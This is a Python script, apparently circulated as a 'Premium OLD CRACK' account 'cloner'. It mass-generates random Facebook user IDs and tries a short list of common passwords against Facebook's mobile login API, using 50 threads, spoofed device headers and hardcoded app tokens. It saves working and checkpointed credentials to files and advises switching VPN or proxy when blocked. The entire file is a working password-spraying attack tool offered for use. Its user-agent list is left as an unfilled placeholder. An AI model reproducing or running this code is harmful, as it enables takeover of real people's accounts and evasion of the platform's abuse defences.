import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import bs4
import datetime
import time
import re
import httpx
import urllib3
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt

class OneManCode_CLONER:
    def __init__(self):
        self.loop = 0 
        self.oks = []
        self.cps = []
        self.gen = []
        self.blocked_requests = 0
        self.total_attempts = 0
    
    def banner(self):
        os.system("clear")
        print("\033[1;32m╔══╗─────╔╗──╔╗──────╔╗")
        print("\033[1;32m║╔╗║─────║║──║║──────║║")
        print("\033[1;32m║╚╝║╔══╗║║╔╗║║╔══╗╔═╝║")
        print("\033[1;32m║╔═╝║╔╗║║╚╝╝║║║╔╗║║╔╗║")
        print("\033[1;32m║║──║╚╝║║╔╗╔╣╚╣╚╝║║╚╝║")
        print("\033[1;32m╚╝──╚══╝╚╝╚╝╚═╩══╝╚══╝")
        print("\033[1;37m─────────────────────────────────")
        print("\033[1;33m[+] \033[1;35mAUTHOR  : OneManCode")
        print("\033[1;33m[+] \033[1;35mTELEGRAM: t.me/blackprogrammer")
        print("\033[1;33m[+] \033[1;35mVERSION : Premium OLD CRACK")
        print("\033[1;37m─────────────────────────────────")

    def debug_stats(self):
        print(f"\n\033[1;35m[DEBUG STATS]")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Blocked Requests: {self.blocked_requests}")
        print(f"OK Accounts: {len(self.oks)}")
        print(f"CP Accounts: {len(self.cps)}")
        print("\033[1;37m─────────────────────────────────")

    def main(self):
        self.banner()
        print("\033[1;35m[\033[1;37m1\033[1;35m] • \033[1;32m 2011-2012 METHOD")
        print("\033[1;32m[\033[1;37m2\033[1;32m] • \033[1;32m 2010 METHOD")
        print("\033[1;34m[\033[1;37m3\033[1;34m] • \033[1;32m 2009 METHOD")
        print("\033[1;36m[\033[1;37m4\033[1;36m] • \033[1;32m 2008 METHOD")
        print("\033[1;37m[\033[1;37m5\033[1;37m] • \033[1;32m 2007 METHOD")
        print("\033[1;33m[\033[1;37m6\033[1;33m] • \033[1;32m 2005-2006 METHOD")
        print("\033[1;35m[\033[1;37m0\033[1;35m] • \033[1;32m EXIT")
        print("─────────────────────────────────")
        select = input("SELECT OPTION : ")
        if select == "1": self.oldClone("2013-14")
        elif select == "2": self.oldClone("2010")
        elif select == "3": self.oldClone("2009")
        elif select == "4": self.oldClone("2008")
        elif select == "5": self.oldClone("2007")
        elif select == "6": self.oldClone("2005-2006")
        else: self.main()

    def oldClone(self, series):
        self.banner()
        if series == "2013-14":
            self.uX = "100009"
            self.uG = 11
        elif series == "2010":
            self.uX = "100001"
            self.uG = 10
        elif series == "2009":
            self.uX = "100000"
            self.uG = 9
        elif series == "2008":
            self.uX = "1000000"
            self.uG = 8   
        elif series == "2007":
            self.uX = "10000000"
            self.uG = 7
        elif series == "2005-2006":
            self.uX = "100000000"
            self.uG = 2006
        else:
            self.uX = "1000000000"
            self.uG = 9
            
        print("EXAMPLE  - 5000,10000")
        limit = int(input("SELECT   - "))
        for _ in range(limit):
            ARNOLD = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(ARNOLD)
            
        with ThreadPoolExecutor(max_workers=50) as executor:
            self.banner()
            print(f" \033[1;32m [\033[1;37m√\033[1;32m] \033[1;37m TOTAL IDS \033[1;32m - {len(self.gen)}")
            print(f" \033[1;32m [\033[1;37m√\033[1;32m]  \033[1;37mUID SERIES \033[1;32m - {series}")
            print(" \033[1;31m [!] If blocked switch VPN/Proxy!")
            print("\033[1;37m─────────────────────────────────")
            
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
                executor.submit(self.CloneOld, ids, passlist)
                
            while True:
                try:
                    time.sleep(10)
                    self.debug_stats()
                except KeyboardInterrupt:
                    sys.exit("\n\033[1;31m[!] Process interrupted by user")

    def ugen(self):
        ua_list = [
            # Keep the full user-agent list from original
            # ... (paste all user agents here)
        ]
        return random.choice(ua_list)

    def CloneOld(self, ids, passlist):
        sys.stdout.write(f"\r\r\x1b[m [OneManCode] {self.loop} | OK:{len(self.oks)} | BLOCKED:{self.blocked_requests}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                self.total_attempts += 1
                data = {
                    'adid': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'cpl': 'true',
                    'credentials_type': 'device_based_login_password',
                    "source": "device_based_login",
                    'error_detail_type': 'button_with_disabled',
                    'format': 'json',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    "family_device_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "locale": "en_US",
                    "client_country_code": "US",
                    "device_id": str(uuid.uuid4()),
                    "method": "auth.login",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
                }
                head = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'user-agent': self.ugen(),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-device-group': '5120',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                    'x-fb-friendly-name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'accept-encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Liger'
                }
                url = "https://b-graph.facebook.com/auth/login"
                response = requests.post(url, data=data, headers=head, verify=True).json()
                
                if "access_token" in response:
                    print(f"\r\r\033[38;5;46m[OK] {ids} | {pas}")
                    open("/sdcard/OneManCode-OK.txt", "a").write(f"{ids}|{pas}\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                    print(f"\r\r\033[38;5;184m[CP] {ids} | {pas}")
                    open("/sdcard/OneManCode-CP.txt", "a").write(f"{ids}|{pas}\n")
                    self.cps.append(ids)
                    break
                elif "request blocked" in str(response).lower():
                    self.blocked_requests += 1
                    print(f"\r\r\033[1;31m[BLOCKED] Detected Facebook block! Change VPN/Proxy")
                    break

            self.loop += 1
            
        except Exception as e:
            if "ConnectionError" in str(e) or "ProxyError" in str(e):
                self.blocked_requests += 1
            return

if __name__ == "__main__":
    OneManCode_CLONER().main()
